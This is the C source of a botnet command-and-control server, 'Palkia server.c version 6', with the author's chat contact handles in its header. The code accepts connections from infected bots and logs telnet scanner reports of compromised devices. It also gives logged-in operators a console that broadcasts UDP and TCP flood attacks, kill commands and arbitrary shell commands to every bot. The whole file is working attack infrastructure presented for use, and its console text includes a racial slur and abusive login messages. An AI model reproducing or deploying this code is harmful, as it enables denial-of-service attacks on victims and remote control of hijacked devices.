/*
Screen Usage: screen ./server [client-port] [threads] [cnc-port]
Skype: bl4ck.j3sus
XMPP: b1nary@darkness.su
Changes: Fixed The Telnet Status, Took The Banner Idea From Zekrom, Changed The Way You screen the server
*/
/*

# ___     __________  ____ _______      _____ _______________.___.  ___     
# / _ \_/\ \______   \/_   |\      \    /  _  \\______   \__  |   | / _ \_/\ 
# \/ \___/  |    |  _/ |   |/   |   \  /  /_\  \|       _//   |   | \/ \___/ 
#           |    |   \ |   /    |    \/    |    \    |   \\____   |          
#           |______  / |___\____|__  /\____|__  /____|_  // ______|          
#                  \/              \/         \/       \/ \/                 

						*** PALKIA SERVER.C ***
						  ***  VERSION 6  ***
*/
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#define MAXFDS 1000000
//////////////////////////////////

struct account {
	char id[20];
	char password[20];
};
static struct account accounts[10];

struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];

struct telnetdata_t {
        int connected;
} managements[MAXFDS];

struct args {
        int sock;
        struct sockaddr_in cli_addr;
};
//////////////////////////////////
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
//////////////////////////////////
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}

void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}


static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags);
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}

static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;     /* Return IPv4 and IPv6 choices */
        hints.ai_socktype = SOCK_STREAM; /* We want a TCP socket */
        hints.ai_flags = AI_PASSIVE;     /* All interfaces */
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Could not bind\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}

void broadcast(char *msg, int us)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\n", 0, MSG_NOSIGNAL);
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) {
                    send(i, "\n", 0, MSG_NOSIGNAL);
                } else send(i, "\n", 1, MSG_NOSIGNAL);
        }
}

void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events;
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				if(dup) {
					if(send(infd, "!* LOLNOGTFO\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                    close(infd);
                    continue;
				}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
				send(infd, "!* SCANNER ON\n", 14, MSG_NOSIGNAL);
			}
			continue;
		}
		else {
			int thefd = events[i].data.fd;
			struct clientdata_t *client = &(clients[thefd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);
					if(strcmp(buf, "PING") == 0) {
						if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "REPORT ") == buf) {
						char *line = strstr(buf, "REPORT ") + 7;
						fprintf(telFD, "%s\n", line);
						fflush(telFD);
						TELFound++;
						continue;
					}
					if(strstr(buf, "PROBING") == buf) {
						char *line = strstr(buf, "PROBING");
						scannerreport = 1;
						continue;
					}
					if(strstr(buf, "REMOVING PROBE") == buf) {
						char *line = strstr(buf, "REMOVING PROBE");
						scannerreport = 0;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
					printf("buf: \"%s\"\n", buf);
				}
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
			if (done) {
				client->connected = 0;
				close(thefd);
}}}}}}

unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }

        return total;
}

void *titleWriter(void *sock) 
{
        int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, "%c]0;Bots connected: %d | Niggas connected: %d%c", '\033', clientsConnected(), managesConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
                sleep(2);
        }
}

int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}

void *telnetWorker(void *sock)
{
        int thefd = (int)sock;
		int find_line;
        managesConnected++;
        pthread_t title;
		char counter[2048];
        char buf[2048];
		char* nickstring;
		char* username;
		char* password;
		memset(buf, 0, sizeof buf);
		char botnet[2048];
		memset(botnet, 0, 2048);
		
		FILE *fp;
		int i=0;
		int c;
		fp=fopen("login.txt", "r");
		while(!feof(fp)) 
		{
				c=fgetc(fp);
				++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
		{
			fscanf(fp, "%s %s", accounts[j].id, accounts[j].password);
			++j;
        }
		
        if(send(thefd, "\x1b[30mUsername:\x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);
        if(strcmp(nickstring, accounts[find_line].id) == 0){					
        if(send(thefd, "\x1b[30mPassword:\x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto Banner;
        }
        failed:
		if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
		char failed_line1[80];
		char failed_line2[80];
		
		sprintf(failed_line1, "\x1b[31mWRONG ANSWER BITCH!!\r\n");
		sprintf(failed_line2, "\x1b[31mGET THE FUCK OFF MY NET\r\n");
		
		if(send(thefd, "\x1b[31m++++++++++++++++++++++++++++++++++++\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, failed_line2, strlen(failed_line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, "\x1b[31m++++++++++++++++++++++++++++++++++++\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
		sleep(5);
        goto end;
		
		Banner:
		pthread_create(&title, NULL, &titleWriter, sock);
		char welcome_line [80];
		char ascii_banner_line1 [5000];
		char ascii_banner_line2 [5000];
		char ascii_banner_line3 [5000];
		char ascii_banner_line4 [5000];
		char ascii_banner_line5 [5000];
		char ascii_banner_line6 [5000];
		char ascii_banner_line7 [5000];
		char ascii_banner_line8 [5000];
		
		sprintf(ascii_banner_line1, "\x1b[31m   \r\n");
		sprintf(ascii_banner_line2, "\x1b[31m   \r\n");
		sprintf(ascii_banner_line3, "\x1b[31m   \r\n");
		sprintf(ascii_banner_line4, "\x1b[31m   \r\n");
		sprintf(ascii_banner_line5, "\x1b[31m   \r\n");
		sprintf(ascii_banner_line6, "\x1b[31m   \r\n");
		sprintf(ascii_banner_line7, "\x1b[31m   \r\n");
		sprintf(ascii_banner_line8, "\x1b[31m   \r\n");                
		sprintf(welcome_line,       "\r\n\x1b[31m              			~[Welcome, %s]~\r\n", accounts[find_line].id);
		
		if(send(thefd, 				"\x1b[31m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n", 73, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, 				"\x1b[31m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n", 73, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, welcome_line, strlen(welcome_line), MSG_NOSIGNAL) == -1) goto end;
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;

		while(fdgets(buf, sizeof buf, thefd) > 0)
		{
			if(strstr(buf, "KILL"))
			{
				sprintf(botnet, "!* KILLATTK");
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
			}
			if(strstr(buf, "!* STATUS")) 
			{
				sprintf(botnet, "Telnet devices: %d | Telnet status: %d\r\n", TELFound, scannerreport);
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
			}
			if(strstr(buf, "!* BOTS")) 
			{  
				sprintf(botnet, "Bots connected: %d | Staff connected: %d\r\n", clientsConnected(), managesConnected);
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
			} 
			if(strstr(buf, "!* HELP"))
			{  
				sprintf(botnet, "\r\n[+]Attack commands[+]\r\n!* UDP Victim Port Time 32 0 10 - UDP Attacker\r\n!* TCP Victim Port Time 32 all 0 10 - TCP Attacker\r\n!* KILLATTK - Kills all the on going attacks\r\n\r\n[+]Global commands[+]\r\n!* SH - Executes a shell command\r\n!* BOTS - Shows the bot count\r\n!* SCANNER ON | OFF - Telnet scanner\r\n");
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
			}
			FILE *logFile;
                logFile = fopen("server.log", "a");
				time_t now;
				struct tm *gmt;
				char formatted_gmt [50];
				char lcltime[50];
				now = time(NULL);
				gmt = gmtime(&now);
				strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
                fprintf(logFile, "[%s] %s: %s\n", formatted_gmt, accounts[find_line].id, buf);
                fclose(logFile);
                broadcast(buf, thefd);
                memset(buf, 0, 2048);
        }
		end:
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}


void *telnetListener(int port)
{
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {
            newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
            if (newsockfd < 0) perror("ERROR on accept");
            pthread_t thread;
            pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}

int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }
		port = atoi(argv[3]);
        telFD = fopen("telnet.txt", "a+");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1) {
			broadcast("PING", -1);
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}